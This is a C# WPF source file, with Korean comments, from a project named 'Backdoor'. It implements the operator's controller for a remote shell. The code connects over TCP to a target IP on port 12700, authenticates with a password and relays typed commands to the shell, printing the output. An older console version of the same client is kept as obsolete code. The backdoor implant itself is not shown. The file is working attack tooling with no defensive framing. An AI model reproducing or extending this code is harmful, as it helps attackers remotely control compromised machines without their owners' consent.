using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace Backdoor
{
    /// <summary>
    /// ShellPage.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class ShellPage : Window
    {
        IPAddress IP;
        Socket Client;
        Thread ShellThread;
        Thread RecvThread;
        StreamWriter OutputStream;
        StreamReader InputStream;
        IPEndPoint RemoteEp;
        bool IsFirstInput = true;

        /// <summary>
        /// IP 초기화
        /// </summary>
        /// <param name="IP"></param>
        public ShellPage(IPAddress IP)
        {
            InitializeComponent();
            this.IP = IP;
        }
        
        /// <summary>
        /// 창이 준비되면 소켓과 끝점을 준비함
        /// </summary>
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            RemoteEp = new IPEndPoint(IP, 12700);
        }

        /// <summary>
        /// 전송 버튼이 눌리면 원격 쉘에 명령 전송
        /// </summary>
        private void Insert_Btn_Click(object sender, RoutedEventArgs e)
        {
            if(IsFirstInput)
            {
                Connect(CommandBox.Text);
                IsFirstInput = false;
                return;
            }
            try
            {
                string Command = CommandBox.Text;
                OutputStream.WriteLine(Command);
                if (Command.Equals("Stream Terminated"))
                {
                    Drop();
                }
            }
            catch (Exception Ex) { }
        }

        /// <summary>
        /// 로그 출력
        /// </summary>
        /// <param name="LogMsg"></param>
        public void Log(string LogMsg)
        {
            Dispatcher.BeginInvoke((Action)delegate
            {
                OutputBox.AppendText(" >" + LogMsg + "\n");
            });
        }
        
        /// <summary>
        /// 수신 대기
        /// </summary>
        public void Listen()
        {
            ThreadStart Ts = new ThreadStart(Recieve);
            RecvThread = new Thread(Ts);
            RecvThread.Start();
        }

        /// <summary>
        /// 원격 쉘에 접속
        /// </summary>
        /// <param name="Pass">원격 쉘의 비밀번호</param>
        public void Connect(string Pass)
        {
            Client.Connect(RemoteEp);
            Stream NetStream = new NetworkStream(Client);
            InputStream = new StreamReader(NetStream);
            OutputStream = new StreamWriter(NetStream);
            OutputStream.AutoFlush = true;
            OutputStream.WriteLine(Pass);
            Log(InputStream.ReadLine());

            ThreadStart Ts = new ThreadStart(Listen);
            ShellThread = new Thread(Ts);
            ShellThread.Start();
        }

        /// <summary>
        /// 원격 쉘로부터 출력 스트림을 받아옴
        /// </summary>
        public void Recieve()
        {
            try
            {
                string Buf = "";
                Log("\r\n");
                while ((Buf = InputStream.ReadLine()) != null)
                {
                    Log(Buf + "\r");
                }
            }
            catch (Exception Ex)
            {
                Log(Ex.StackTrace);
            }
        }

        /// <summary>
        /// 연결 중단
        /// </summary>
        public void Drop()
        {
            try
            {
                RecvThread.Abort();
                RecvThread = null;
                return;
            }
            catch (Exception)
            {
                return;
            }
        }
    }

    /// <summary>
    /// 스탠드 얼론 코드 (안씀)
    /// </summary>
    [Obsolete("안써요")]
    public class ShellListener
    {
        Socket Client;
        Thread ShellThread;
        Thread RecvThread;
        StreamWriter OutputStream;
        StreamReader InputStream;
        IPEndPoint RemoteEp;
        public ShellListener(IPAddress IP)
        {
            Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            RemoteEp = new IPEndPoint(IP, 12700);
        }

        public void Listen()
        {
            ThreadStart Ts = new ThreadStart(Recieve);
            RecvThread = new Thread(Ts);
            RecvThread.Start();
        }

        public void Connect(string Pass)
        {
            Client.Connect(RemoteEp);
            Stream NetStream = new NetworkStream(Client);
            InputStream = new StreamReader(NetStream);
            OutputStream = new StreamWriter(NetStream);
            OutputStream.AutoFlush = true;
            OutputStream.WriteLine(Pass);
            Console.WriteLine(InputStream.ReadLine());

            ThreadStart Ts = new ThreadStart(Listen);
            ShellThread = new Thread(Ts);
            ShellThread.Start();
            try
            {
                while (true)
                {
                    string Command = Console.ReadLine();
                    OutputStream.WriteLine(Command);

                    if (Command.Equals("Stream Terminated"))
                    {
                        Drop();
                    }
                }
            }
            catch (Exception Ex) { }
        }

        public void Recieve()
        {
            try
            {
                string Buf = "";
                Console.WriteLine("\r\n");
                while ((Buf = InputStream.ReadLine()) != null)
                {
                    Console.WriteLine(Buf + "\r");
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex.StackTrace);
            }
        }
        public void Drop()
        {
            try
            {
                RecvThread.Abort();
                RecvThread = null;
                return;
            }
            catch (Exception)
            {
                return;
            }
        }
    }
}
